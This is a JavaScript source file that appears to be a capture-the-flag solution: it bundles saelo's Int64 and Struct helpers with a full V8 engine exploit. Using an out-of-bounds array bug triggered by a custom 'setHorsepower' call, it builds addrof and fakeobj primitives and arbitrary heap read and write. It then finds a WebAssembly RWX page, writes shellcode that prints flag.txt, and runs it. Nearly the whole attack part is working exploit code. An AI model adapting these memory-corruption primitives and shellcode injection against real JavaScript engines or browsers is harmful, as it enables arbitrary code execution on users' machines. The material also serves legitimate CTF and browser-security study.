/* ### Utils, thanks saelo ### */ 

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Gro√ü
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.Eight = new Int64(8);


// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


// Trigger Garbage collection
function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

////////////////////////////////////////////////////////////////////////////////
/// Begin Exploit //////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

/// Resources //////////////////////////////////////////////////////////////////
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

// cat ./flag.txt
var shellcode = new Uint32Array([
    0x01757968, 0x24348101, 0x01010101, 0x2f2eb848, 0x67616c66, 
    0x6a50742e, 0x89485802, 0x99f631e7, 0xba41050f, 0x7fffffff, 
    0x6ac68948, 0x016a5828, 0x050f995f, 0x00000000, 
])


function h(i){return "0x"+i.toString(16)}
function I(i){return new Int64(i)}


/// Actual Exploit /////////////////////////////////////////////////////////////

// Allocate the obj first, to ensure p/q are directly next to each other.
var obj = {a: 'a'}
// Create a double array
var p = [1.2]
// Create an obj array
var q = [obj]
p.setHorsepower(100)
var float_map = I(gl(p[1]))

// Get lower
function gl(dbl) {
	return Struct.unpack(Struct.int32, Int64.fromDouble(dbl).bytes().slice(0, 4))
}

// Get upper
function gu(dbl) {
	return Struct.unpack(Struct.int32, Int64.fromDouble(dbl).bytes().slice(4, 8))
}

// Combines the lower 4 bytes of two int64's into a new int64
function combine(a, b) {
	var lower = a.bytes().slice(0, 4)
	var upper = b.bytes().slice(0, 4)
	var bytes = lower.concat(upper)
	return new Int64(bytes)
}

function addrof(object) {
	q[0] = object
	// Reach ahead in the `p` array, and pull out `object`'s pointer as a double.
	return new Int64(gl(p[4]))
}

function fakeobj(addr) {
	p[4] = combine(addr, I(gu(p[4]))).asDouble()
	// Inverse of addrof
	return q[0]
}

var arb_arr = [p[1], 1.2]
// Read any value on the V8 heap
function arbread(read_addr) {
	var fake_addr = Sub(addrof(arb_arr), I(0x10))

	// Skip past the first entry in elements (some pointer thing).
	// The real values start after the first 8 bytes
	read_addr = Sub(read_addr, I(8))
	// Element address, followed by element length <<1
	// Length must be at least 0x10 (== 1)
	var read_addr_len = combine(read_addr, I(0x10))
	arb_arr[1] = read_addr_len.asDouble()

	var fake = fakeobj(fake_addr)
	return Int64.fromDouble(fake[0])
}


// Change any value on the V8 heap
function arbwrite(addr, value) {
	var fake_addr = Sub(addrof(arb_arr), I(0x10))

	addr = Sub(addr, I(8))
	var addr_len = combine(addr, I(0x10))
	arb_arr[1] = addr_len.asDouble()

	var fake = fakeobj(fake_addr)
	fake[0] = value.asDouble()
}

var rwx_arr  = new ArrayBuffer(0x1000);
var rwx_view = new Uint32Array(rwx_arr);
function write_shellcode(addr) {
	// Backing store ptr is at offset 0x60 from addrof(u8_arr)
	// --> Move the backing pointer to the location of the RWX page
	arbwrite(Add(addrof(rwx_arr), I(0x60)), addr)
	// Copy the shellcode
	for (var i = 0; i < shellcode.length; i++) {
		rwx_view[i] = shellcode[i]
	}
}


// Test fake obj
var c = {}
c.a = "blah"
var d = {}
var addr_c = addrof(c)
addrof({})
d = fakeobj(addr_c)
if (d.a != "blah") {
	console.log("[!] AddrOf/FakeObj borked.")
} else {
	console.log("[i] AddrOf/FakeObj confirmed working.")
	console.log("[i] Float map pointer: " + float_map)
	// Load a dummy WASM function into an RWX page
	var wasmMod = new WebAssembly.Module(wasmCode);
	var m = new WebAssembly.Instance(wasmMod);
	var f = m.exports.main;


	var addr_m = addrof(m);
	console.log("[i] WASM instance is at: " + addr_m)
	// RWX page is found at offset +0x68 relative to m
	var pRWX = Add(0x68, addr_m)
	console.log("[i] RWX pointer        : " + pRWX)
	var RWX = arbread(pRWX)
	console.log("[i] RWX page at: " + RWX)
	console.log("[i] Writing shellcode to : " + RWX)
	write_shellcode(RWX)
	console.log("[i] Executing shellcode. Godspeed.")
	f()
}

